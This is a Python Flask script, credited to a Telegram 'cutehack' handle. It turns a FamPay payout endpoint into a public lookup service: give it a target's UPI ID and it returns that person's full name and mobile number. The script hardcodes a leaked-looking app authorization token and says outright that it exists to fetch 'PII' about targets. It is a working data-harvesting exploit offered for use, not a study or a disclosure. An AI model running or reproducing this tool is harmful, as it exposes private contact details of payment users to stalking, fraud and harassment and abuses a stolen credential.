from flask import Flask, jsonify, request
import requests
import json
import sys

app = Flask(__name__)

# Credits
# @never_delete | telegram cutehack

WESTEROS_URL = "https://westeros.famapp.in/txn/create/payout/add/"

# IMPORTANT: The 'authorization' token provided in the original script
# might be time-sensitive or user-specific. If the API stops working,
# this token is likely the first thing to check and update.
HEADERS = {
  'User-Agent': "A015 | Android 15 | Dalvik/2.1.0 | Tetris | 318D0D6589676E17F88CCE03A86C2591C8EBAFBA |  (Build -1) | 3DB5HIEMMG",
  'Accept': "application/json",
  'Content-Type': "application/json",
  'authorization': "Token eyJlbmMiOiJBMjU2Q0JDLUhTNTEyIiwiZXBrIjp7Imt0eSI6Ik9LUCIsImNydiI6Ilg0NDgiLCJ4IjoicGEwWmVNd255eFBKYXB5ZU9udXlkV1J1OEJWbFlMY1l2YkliUC1FOXhkdUo2dzNGbmNOTDFHMlZqVm9ZZWktOGEzRlRaX29tdGFRIn0sImFsZyI6IkVDREgtRVMifQ.._Fz2hxuGqpjf7V1pCeznsA.g4R7FbdRU3R7m1j3bkSyEljVTsqv8lLCEDy4Vsh2-06j1w1lw4f7ME6j6HB_B_8GMV6H63BR2mU-ogNBW1uKIDDiJQFKn4KkmOdbZX_Gr7y6BIty5FwqV6Tx4pk2NVMdl07eNPyLZZExpp9whLOOxrB02fSxMTptvHMYsSAkQaEt1eHaLkERPSj84loywzsFjWSmgYlr9Tt0MaFoB4Va348_ZFs1JI1sDpq9ZEicW2RBnz2vka2tz_zki-5rj7Enhi9HP5xMoo9XOwvmnvZAAQ.tWG08-yG0nr1vF7VKDUUC4zLHbkB3rYegjW47kP5Vk8"
}

def fetch_fampay_pii(upi_id):
    """
    Fetches PII for a FamPay UPI ID.
    Returns a dictionary with user info or an error message.
    """
    
    payload = {
        "upi_string": f"upi://pay?pa={upi_id}",
        "init_mode": "00",
        "is_uploaded_from_gallery": False
    }
    
    try:
        response = requests.post(WESTEROS_URL, data=json.dumps(payload), headers=HEADERS, timeout=10)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        data = response.json()
        
        user_info = data.get("user", {})
        if not user_info:
            return {"error": f"'user' object not found in the response for {upi_id}.", "status_code": 404}

        first_name = user_info.get("first_name", "")
        last_name = user_info.get("last_name", "")
        full_name = f"{first_name} {last_name}".strip()
        
        phone_number = user_info.get("contact", {}).get("phone_number")

        final_output = {
            "name": full_name,
            "upi_id": upi_id,
            "mobile_number": phone_number,
            "credits": "@never_delete | telegram cutehack"
        }
        
        return final_output

    except requests.exceptions.HTTPError as e:
        return {"error": f"API Request Error: HTTP {e.response.status_code} - {e.response.text}", "status_code": e.response.status_code}
    except requests.exceptions.ConnectionError as e:
        return {"error": f"API Connection Error: {e}", "status_code": 503}
    except requests.exceptions.Timeout:
        return {"error": "API Request timed out.", "status_code": 408}
    except requests.exceptions.RequestException as e:
        return {"error": f"An unexpected API request error occurred: {e}", "status_code": 500}
    except json.JSONDecodeError:
        return {"error": "Failed to decode JSON response from the FamPay API.", "status_code": 500}
    except Exception as e:
        return {"error": f"An internal server error occurred: {e}", "status_code": 500}

@app.route('/fampay_pii', methods=['GET'])
def get_fampay_pii():
    """
    Flask API endpoint to fetch FamPay PII using a UPI ID.
    Usage: GET /fampay_pii?upi_id=<target_upi_id>
    """
    upi_id = request.args.get('upi_id')

    if not upi_id:
        return jsonify({"error": "Missing 'upi_id' query parameter. Usage: /fampay_pii?upi_id=someuser@fam", "credits": "@never_delete | telegram cutehack"}), 400

    if "@fam" not in upi_id.lower():
        # You can choose to still process or warn. Here we will warn and proceed.
        print(f"[!] Warning: This script is optimized for '@fam' UPIs. You may get limited or no data for {upi_id}.", file=sys.stderr)

    result = fetch_fampay_pii(upi_id)

    if "error" in result:
        status_code = result.get("status_code", 500)
        result["credits"] = "@never_delete | telegram cutehack" # Add credits to error responses too
        return jsonify(result), status_code
    else:
        return jsonify(result), 200

if __name__ == '__main__':
    # To run this Flask app:
    # 1. Save it as a .py file (e.g., app.py)
    # 2. Run from your terminal: python app.py
    # 3. Access in your browser or with cURL: http://127.0.0.1:5000/fampay_pii?upi_id=targetname@fam
    app.run(debug=True, host='0.0.0.0', port=5000)
